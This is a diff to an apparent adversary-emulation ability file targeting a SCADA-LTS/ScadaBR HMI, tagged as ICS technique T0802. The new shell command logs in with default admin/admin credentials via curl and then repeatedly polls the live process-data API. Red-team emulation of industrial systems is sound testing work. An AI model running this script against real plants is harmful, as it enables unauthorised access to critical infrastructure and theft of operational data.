@@ -3,8 +3,7 @@
 - id: a7b8c9d0-7777-7777-7777-000000000002
   name: SCADA-LTS - Automated Process Data Theft
   description: |
-    Continuously poll SCADA-LTS data point values every 10 seconds
-    for 2 minutes, exfiltrating real-time process data.
+    Poll data points for 1 minute (6 cycles) instead of 2 minutes
   tactic: collection
   technique_id: T0802
   technique_name: Automated Collection
@@ -12,10 +11,14 @@
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080/ScadaBR" &&
-      for cycle in $(seq 1 12); do
-        echo "[Cycle $cycle] $(date +%H:%M:%S)" &&
-        curl -s -b /tmp/hmi.jar "$HMI/api/pointValues/latest" 2>/dev/null |
-        python3 -m json.tool 2>/dev/null || echo "polling..." ;
-        sleep 10;
-      done
+      HMI="http://192.168.90.107:8080" &&
+      curl -s -c /tmp/hmi.jar
+      -d "username=admin&password=admin"
+      "$HMI/login.htm" -o /dev/null &&
+      for cycle in 1 2 3 4 5 6; do
+        echo "[Cycle $cycle]" &&
+        curl -s -b /tmp/hmi.jar "$HMI/api/pointValues/latest" 2>/dev/null &&
+        echo "" && sleep 5;
+      done &&
+      echo "DATA_COLLECTION_COMPLETE"
+    timeout: 60
